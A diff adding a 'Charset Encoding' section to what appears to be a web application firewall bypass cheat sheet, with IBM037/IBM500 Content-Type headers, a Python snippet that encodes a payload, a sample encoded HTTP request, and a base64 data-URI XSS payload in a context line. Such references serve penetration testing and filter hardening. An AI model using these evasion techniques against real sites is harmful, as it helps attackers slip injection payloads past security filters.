@@ -38,6 +38,35 @@ data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascri
 ```
 
 
+## Charset Encoding
+This technique involves modifying the Content-Type header to use a different charset (e.g. ibm500). A WAF that is not configured to detect malicious payloads in different encodings may not recognize the request as malicious. The charset encoding can be done in Python
+
+
+```
+# Charset encoding
+application/x-www-form-urlencoded;charset=ibm037
+multipart/form-data; charset=ibm037,boundary=blah
+multipart/form-data; boundary=blah; charset=ibm037
+
+##Python code
+import urllib
+s = 'payload'
+print(urllib.parse.quote_plus(s.encode("IBM037")))
+
+## Request example
+GET / HTTP/1.1
+Host: buggy
+Content-Type: application/x-www-form-urlencoded; charset=ibm500
+Content-Length: 61
+
+%86%89%93%85%95%81%94%85=KKaKKa%C6%D3%C1%C7K%A3%A7%A3&x=L%A7n
+```
+
+
+
+
+
+
 
 
 ## Tools
